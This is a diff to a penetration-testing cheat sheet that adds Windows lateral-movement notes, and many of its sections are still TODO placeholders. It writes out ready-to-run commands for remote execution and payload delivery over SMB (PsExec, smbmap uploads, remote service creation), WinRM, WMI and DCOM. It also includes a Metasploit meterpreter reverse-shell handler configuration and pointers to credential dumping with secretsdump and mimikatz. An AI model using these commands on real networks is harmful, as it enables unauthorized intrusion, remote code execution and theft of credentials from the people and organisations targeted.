@@ -286,7 +286,137 @@ for i in {1..254}; do (ping $SUBNET.$i -c 1 -w 5  >/dev/null && echo "$SUBNET.$i
 
 ## Windows Pivoting/Tooling
 
+### Interacting with Native Protocols
+
+#### SMB
+
+Using native Windows utilities:
+
+```bat
+:: Basic check to see if we have administrator access to the remote machine.
+dir \\HOST\C$
+
+:: TODO
+TODO
+```
+
+[`PsExec.exe`](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec), with admin privileges, lets you open shells on other Windows boxes:
+
+```bat
+psexec.exe -accepteula \\10.10.10.10 cmd.exe
+```
+
+[`smbmap.py`](https://github.com/ShawnDEvans/smbmap) also can automate a few SMB enumeration tasks from a Linux workstation:
+
+```sh
+# Show access to drives.
+smbmap -u 'MyUsername' -p 'MyPassword' -H 10.10.10.10
+
+# List files in a directory.
+smbmap -u 'MyUsername' -p 'MyPassword' -H 10.10.10.10 -r 'C$\Users'
+
+# Execute a command.
+smbmap -u 'MyUsername' -p 'MyPassword' -H 10.10.10.10 -x 'whoami'
+
+# Download/upload files.
+smbmap -u 'MyUsername' -p 'MyPassword' -H 10.10.10.10 --download 'C$\temp\file.txt'
+smbmap -u 'MyUsername' -p 'MyPassword' -H 10.10.10.10 --upload './local/payload.exe' 'C$\temp\upload.exe'
+```
+
+Impacket's [TODO](TODO) provides TODO from a Linux workstation:
+
+```sh
+TODO
+```
+
+[`winexe`](https://tools.kali.org/maintaining-access/winexe) is yet another option from a Linux workstation:
+
+```sh
+TODO
+```
+
+We can also kick off payloads by creating and starting a service on a remote machine:
+
+```bat
+copy payload.exe \\10.10.10.10\C$\windows\temp
+sc \\10.10.10.10 create MyService binpath= "C:\windows\temp\payload.exe"
+sc \\10.10.10.10 start MyService
+
+:: We need to migrate out of the service process relatively quickly; consequently,
+:: we should probably be using a meterpreter payload and configure a handler to
+:: auto-migrate:
+use exploit/multi/handler
+set LHOST 10.10.10.11
+set LPORT 31337
+set PAYLOAD windows/meterpreter/reverse_tcp
+set AutoRunScript post/windows/manage/migrate
+execute -j
+```
+
+#### PowerShell Remoting and WinRM
+
+Helpful resources for WinRM and PS remoting:
+
+* [A look under the hood at PowerShell Remoting through a cross platform lens](http://www.hurryupandwait.io/blog/a-look-under-the-hood-at-powershell-remoting-through-a-ruby-cross-plaform-lens)
+* [TODO](TODO)
+
+Using raw WinRM to run commands on other machines:
+
+```bat
+winrs.exe -r:http://10.10.10.10:5985 -u:MyUsername -p:MyPassword whoami
+```
+
+TODO
+
+#### WMI
+
+WMI allows for some remote management options natively from Windows (with admin access on target machines). Some PowerShell examples:
+
+```powershell
+# Check to see if we have administrator access to the machine.
+Get-WMIObject -Class win32_operatingsystem -Computername 10.10.10.10
+```
+
+Some examples from `cmd.exe`:
+
+```bat
+:: Execute a binary on another machine.
+wmic /node:10.10.10.10 process call create payload.exe
+```
+
+From a Linux workstation, Impacket's [TODO](TODO) provides some query and execution tooling:
+
+```sh
+# TODO
+TODO
+
+# Query event filter related entities.
+TODO
+```
+
+#### DCOM
+
+Useful resources:
+
+* [Lateral movement using the MMC20.Application COM Object](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
+* [Lateral movement via DCOM round 2](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
+* [New lateral movement techniques abuse DCOM technology](https://www.cybereason.com/blog/dcom-lateral-movement-techniques)
+
+DCOM presents a protocol that can allow for command execution over remote application-specific channels (sometimes not requiring admin access to targets):
+
+```powershell
+$target = "10.10.10.10"
+
+# Execute a command via the MMC20.Application COM object.
+$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", $target))
+$com.Document.ActiveView.ExecuteShellCommand("C:\temp\payload.exe", $null, "-cmd -line -args", "7")
+```
+
 ### Impacket Family of Tools
+
+TODO: maybe remove this section, but need to look through list
+
+### File System Enumeration
 
 TODO
 
@@ -294,11 +424,19 @@ TODO
 
 TODO
 
-### Powershell Empire
+### PowerShell Empire
 
 Useful cheatsheet can be found [here](https://github.com/HarmJ0y/CheatSheets/blob/master/Empire.pdf).
 
 ### Pillaging Credentials
+
+#### Impacket's `secretsdump.py`
+
+[`secretsdump.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) can be used to dump hashes from , both over the network and offline from hive files.
+
+```sh
+TODO
+```
 
 #### DPAPI Fun with Mimikatz
 
@@ -342,12 +480,22 @@ dpapi::cred /in:<FILENAME>
 
 Also see [the mimikatz wiki article on decrypting Credential Manager stored credentials](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials). The `harmj0y` post linked above also goes into detail about more advanced domain techniques.
 
-## Spraying Creds
+## Common Windows Vulnerabilities
 
-### SMB
+TODO
 
-TODO: cme
+## Linux Pivoting/Tooling
 
-### SSH
+### File System Enumeration
 
-TODO: hydra? medusa?
+TODO
+
+## Bruteforcing and Spraying Creds
+
+### Bruteforcing
+
+TODO
+
+### Spraying
+
+TODO: cme?
